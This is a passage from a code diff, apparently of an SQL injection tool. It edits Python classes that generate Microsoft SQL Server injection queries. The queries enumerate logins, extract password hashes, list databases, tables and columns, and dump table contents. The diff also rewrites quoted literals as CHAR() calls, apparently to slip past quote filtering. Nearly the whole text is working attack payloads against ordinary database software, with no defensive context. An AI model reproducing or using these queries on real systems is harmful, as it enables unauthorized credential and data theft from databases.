+          " AND x.name NOT IN (SELECT TOP ${row_pos} x.name FROM ${db}..syscolumns x,${db}..sysobjects y WHERE x.id=y.id AND y.name='${table}'))a ", db=db, table=table)
+    return c, q
+
+  def dump_table(self, db, table, cols):
+    if not db:
+      raise NotImplementedError('-D required')
+    if not table:
+      raise NotImplementedError('-T required')
+    if not cols:
+      raise NotImplementedError('-C required')
+
+    c = T('(SELECT LTRIM(STR(COUNT(*))) X FROM ${db}..${table})a', db=db, table=table)
+    q = T('(SELECT TOP ${row_count} ${cols} X FROM ${db}..${table} WHERE ${cols}' \
+          ' NOT IN (SELECT TOP ${row_pos} ${cols} FROM ${db}..${table}))a', cols="+char(58)+".join('CAST(%s AS NVARCHAR(4000))' % c for c in cols), db=db, table=table) # FIXME no need to have cols everywhere?
+    return c, q
+
+# }}}
+
+# MSSQL_Blind {{{
 class MSSQL_Blind(SQLi_Base):
 
   def banner(self):
@@ -632,7 +900,7 @@ class MSSQL_Blind(SQLi_Base):
   def enum_users(self):
     c = 'SELECT LTRIM(STR(COUNT(name))) FROM master..syslogins'
     q = 'SELECT TOP 1 name FROM master..syslogins WHERE name' \
-        ' NOT IN (SELECT TOP ${row_pos} name FROM master..syslogins ORDER BY name) ORDER BY name'
+        ' NOT IN (SELECT TOP ${row_pos} name FROM master..syslogins)'
     return c, q
 
   def enum_passwords(self, user):
@@ -641,23 +909,22 @@ class MSSQL_Blind(SQLi_Base):
 
     c = T("SELECT LTRIM(STR(COUNT(password_hash))) FROM sys.sql_logins WHERE name='${user}'", user=user)
     q = T("SELECT TOP 1 master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins WHERE name='${user}'"\
-        " AND password_hash NOT IN (SELECT TOP ${row_pos} password_hash FROM sys.sql_logins WHERE name='${user}' ORDER BY password_hash)" \
-        " ORDER BY password_hash", user=user)
+        " AND password_hash NOT IN (SELECT TOP ${row_pos} password_hash FROM sys.sql_logins WHERE name='${user}')", user=user)
     return c, q
 
   def enum_dbs(self):
     c = 'SELECT LTRIM(STR(COUNT(name))) FROM master..sysdatabases'
     q = 'SELECT TOP 1 name FROM master..sysdatabases WHERE name' \
-        ' NOT IN (SELECT TOP ${row_pos} name FROM master..sysdatabases ORDER BY name) ORDER BY name'
+        ' NOT IN (SELECT TOP ${row_pos} name FROM master..sysdatabases)'
     return c, q
 
   def enum_tables(self, db):
     if not db:
       raise NotImplementedError('-D required')
 
-    c = T("SELECT LTRIM(STR(COUNT(name))) FROM %s..sysobjects WHERE xtype = 'U'", db=db)
-    q = T("SELECT TOP 1 name FROM ${db}..sysobjects WHERE xtype = 'U'" \
-          " AND name NOT IN (SELECT TOP ${row_pos} name FROM ${db}..sysobjects WHERE xtype = 'U' ORDER BY name) ORDER BY name", db=db)
+    c = T("SELECT LTRIM(STR(COUNT(name))) FROM %s..sysobjects WHERE xtype=CHAR(85)", db=db)
+    q = T("SELECT TOP 1 name FROM ${db}..sysobjects WHERE xtype=CHAR(85) AND name" \
+          " NOT IN (SELECT TOP ${row_pos} name FROM ${db}..sysobjects WHERE xtype=CHAR(85))", db=db)
     return c, q
 
   def enum_columns(self, db, table):
@@ -668,8 +935,7 @@ class MSSQL_Blind(SQLi_Base):
 
     c = T("SELECT LTRIM(STR(COUNT(x.name))) FROM ${db}..syscolumns x,${db}..sysobjects y WHERE x.id=y.id AND y.name='${table}'", db=db, table=table)
     q = T("SELECT TOP 1 x.name FROM ${db}..syscolumns x,${db}..sysobjects y WHERE x.id=y.id AND y.name='${table}' AND x.name" \
-          " NOT IN (SELECT TOP ${row_pos} x.name FROM ${db}..syscolumns x,${db}..sysobjects y WHERE x.id=y.id AND y.name='${table}' ORDER BY x.name)" \
-          " ORDER BY x.name", db=db, table=table)
+          " NOT IN (SELECT TOP ${row_pos} x.name FROM ${db}..syscolumns x,${db}..sysobjects y WHERE x.id=y.id AND y.name='${table}')", db=db, table=table)
     return c, q
 
   def dump_table(self, db, table, cols):
@@ -682,7 +948,7 @@ class MSSQL_Blind(SQLi_Base):
 
     c = T("SELECT LTRIM(STR(COUNT(*))) FROM ${db}..${table}", db=db, table=table)
     q = T("SELECT TOP 1 ${cols} FROM ${db}..${table} WHERE ${cols}" \
-          " NOT IN (SELECT TOP ${row_pos} ${cols} FROM ${db}..${table} ORDER BY 1) ORDER BY 1", cols="+':'+".join(cols), table=table, db=db)
+          " NOT IN (SELECT TOP ${row_pos} ${cols} FROM ${db}..${table} ORDER BY 1) ORDER BY 1", cols="+char(58)+".join(cols), table=table, db=db)
     return c, q
 # }}}
 
